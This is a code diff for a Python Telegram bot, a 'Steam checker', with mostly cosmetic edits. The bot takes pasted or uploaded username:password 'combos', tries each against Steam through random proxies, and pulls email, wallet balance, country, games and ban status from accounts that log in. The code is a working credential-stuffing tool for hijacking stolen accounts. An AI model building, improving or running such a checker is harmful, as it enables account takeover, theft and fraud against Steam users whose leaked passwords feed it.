@@ -2,7 +2,7 @@
 # -*- coding: utf-8 -*-
 
 """
-STEAM CHECKER TELEGRAM BOT - Fixed Text Input
+STEAM CHECKER TELEGRAM BOT - Fixed Text Input (Clean Version)
 """
 
 import os
@@ -26,6 +26,7 @@ from telegram import Update
 from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
 from telegram.constants import ParseMode
 
+# ========================= CONFIG =========================
 TELEGRAM_TOKEN = os.getenv("TELEGRAM_TOKEN")
 OWNER_ID = int(os.getenv("OWNER_ID", "0").strip())
 
@@ -40,7 +41,7 @@ lock = threading.Lock()
 
 logging.basicConfig(level=logging.INFO)
 
-# ====================== HELPERS & CHECKER (same as before) ======================
+# ====================== HELPERS ======================
 def create_results_folder():
     Path("Results").mkdir(parents=True, exist_ok=True)
 
@@ -59,6 +60,7 @@ def shorten_games(games, limit=12):
         return " | ".join(games[:limit]) + f" ... (+{len(games)-limit})"
     return " | ".join(games)
 
+# ====================== CHECKER ======================
 def check_steam_account(combo, proxy_url=None):
     try:
         username, password = combo.strip().split(':', 1)
@@ -120,10 +122,18 @@ def check_steam_account(combo, proxy_url=None):
         vac, gban, cban = parse_ban_page(r_profile.text)
 
         return {
-            "username": username, "password": password, "email": email,
-            "balance": balance, "country": country, "total_games": total_games,
-            "games": games, "level": level, "limited": limited,
-            "vac_bans": vac, "game_bans": gban, "community_ban": cban
+            "username": username,
+            "password": password,
+            "email": email,
+            "balance": balance,
+            "country": country,
+            "total_games": total_games,
+            "games": games,
+            "level": level,
+            "limited": limited,
+            "vac_bans": vac,
+            "game_bans": gban,
+            "community_ban": cban,
         }
     except:
         return None
@@ -175,7 +185,7 @@ def parse_ban_page(html):
     except: pass
     return vac, gban, cban
 
-# ====================== PROCESSING ======================
+# ====================== PROCESS ======================
 def process_account(combo, proxies, chat_id, bot):
     proxy = random.choice(proxies) if proxies else None
     result = check_steam_account(combo, proxy)
@@ -255,7 +265,8 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID: return
     await update.message.reply_text(
         "🤖 <b>Steam Checker Bot Ready</b>\n\n"
-        "Paste combos directly (one per line) or upload .txt file\n"
+        "Paste combos directly (one per line)\n"
+        "Or upload .txt file\n"
         "/status", parse_mode=ParseMode.HTML)
 
 async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -271,17 +282,16 @@ async def status_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if update.effective_user.id != OWNER_ID: return
-    
     text = update.message.text.strip()
     if not text or ':' not in text:
         return
 
     combos = [line.strip() for line in text.splitlines() if ':' in line.strip() and len(line.strip()) > 5]
     if not combos:
-        await update.message.reply_text("No valid combos found in your message.")
+        await update.message.reply_text("No valid combos found.")
         return
 
-    await update.message.reply_text(f"✅ Received {len(combos)} combos. Starting check with 15 threads...")
+    await update.message.reply_text(f"✅ Received {len(combos)} combos. Starting check...")
 
     proxies = context.user_data.get('proxies', [])
     asyncio.create_task(run_checker(combos, proxies, update.effective_chat.id, context.bot))
@@ -293,7 +303,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await update.message.reply_text("Only .txt files!")
         return
 
-    await update.message.reply_text(f"📥 Received file: {doc.file_name}")
+    await update.message.reply_text(f"📥 Received: {doc.file_name}")
     file = await doc.get_file()
     path = f"/tmp/{doc.file_name}"
     await file.download_to_drive(path)
@@ -313,6 +323,7 @@ async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
     proxies = context.user_data.get('proxies', [])
     asyncio.create_task(run_checker(combos, proxies, update.effective_chat.id, context.bot))
 
+# ====================== MAIN ======================
 def main():
     create_results_folder()
     app = Application.builder().token(TELEGRAM_TOKEN).build()
